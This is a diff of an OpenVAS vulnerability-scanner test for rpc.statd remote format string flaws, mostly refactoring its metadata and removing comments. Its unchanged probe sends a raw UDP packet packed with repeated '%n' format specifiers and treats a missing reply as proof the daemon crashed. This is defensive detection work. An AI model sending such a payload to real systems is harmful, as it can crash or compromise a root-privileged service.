@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_nfs_rpc_statd_mult_format_string_vuln.nasl 4949 2017-01-05 09:00:29Z cfi $
+# $Id: secpod_nfs_rpc_statd_mult_format_string_vuln.nasl 10969 2018-08-15 06:28:22Z cfischer $
 #
 # Nfs-utils rpc.statd Multiple Remote Format String Vulnerabilities
 #
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902725");
-  script_version("$Revision: 4949 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-01-05 10:00:29 +0100 (Thu, 05 Jan 2017) $");
+  script_version("$Revision: 10969 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-15 08:28:22 +0200 (Wed, 15 Aug 2018) $");
   script_tag(name:"creation_date", value:"2011-09-09 17:36:48 +0200 (Fri, 09 Sep 2011)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
@@ -45,25 +45,20 @@ if(description)
   script_xref(name:"URL", value:"http://www.iss.net/security_center/reference/vuln/RPC_Statd_Format_Attack.htm");
   script_xref(name:"URL", value:"http://support.coresecurity.com/impact/exploits/191000d57f477b31f74df301b1d96722.html");
 
-  tag_impact = "Successful exploitation could allow attackers to execute arbitrary code with
+  script_tag(name:"impact", value:"Successful exploitation could allow attackers to execute arbitrary code with
   the privileges of the rpc.statd process, typically root.
 
-  Impact Level: System/Application";
+  Impact Level: System/Application");
 
-  tag_insight = "The flaws are due to errors in rpc.statd/kstatd daemons logging
+  script_tag(name:"insight", value:"The flaws are due to errors in rpc.statd/kstatd daemons logging
   system. A call to syslog in the program takes data directly from the remote
-  user, this data could include printf-style format specifiers.";
+  user, this data could include printf-style format specifiers.");
 
-  tag_solution = "Upgrade to latest of nfs-utils version 0.1.9.1 or later,
-  For updates refer to http://sourceforge.net/projects/nfs/files/nfs-utils/";
+  script_tag(name:"solution", value:"Upgrade to latest of nfs-utils version 0.1.9.1 or later,
+  For updates refer to http://sourceforge.net/projects/nfs/files/nfs-utils/");
 
-  tag_summary = "The host is running statd service and is prone to multiple remote
-  format string vulnerabilities.";
-
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  script_tag(name:"summary", value:"The host is running statd service and is prone to multiple remote
+  format string vulnerabilities.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_probe");
@@ -76,11 +71,9 @@ include("byte_func.inc");
 
 RPC_PROG = "100024";
 
-## Get the rpc port, running statd service
 port = get_rpc_port( program:RPC_PROG, protocol:IPPROTO_UDP );
 if( ! port ) exit( 0 );
 
-## Check if udp port is alive by sending some data
 req = raw_string( 0x78, 0xE0, 0x80, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                   0x00, 0x02, 0x00, 0x01, 0x86, 0xB8, 0x00, 0x00, 0x00, 0x01,
                   0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
@@ -90,11 +83,9 @@ req = raw_string( 0x78, 0xE0, 0x80, 0x4D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                   0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x4E, 0x00, 0x00, 0x00 );
 
-## open socket
 soc = open_sock_udp( port );
 if( ! soc ) exit( 0 );
 
-## send the request and get the response
 send( socket:soc, data:req );
 res = recv( socket:soc, length:4096 );
 if( isnull( res ) ) {
@@ -117,14 +108,11 @@ req = raw_string( 0x42, 0x99, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                   0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25,
                   0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25, 0x6E, 0x25 );
 
-## send the crafted data
 send( socket:soc, data:req );
 res = recv( socket:soc, length:1024 );
 
-## Close the socket
 close( soc );
 
-## Confirm vulnerability by checking response
 if( ! res ) {
   security_message( port:port, protocol:"udp" );
   exit( 0 );
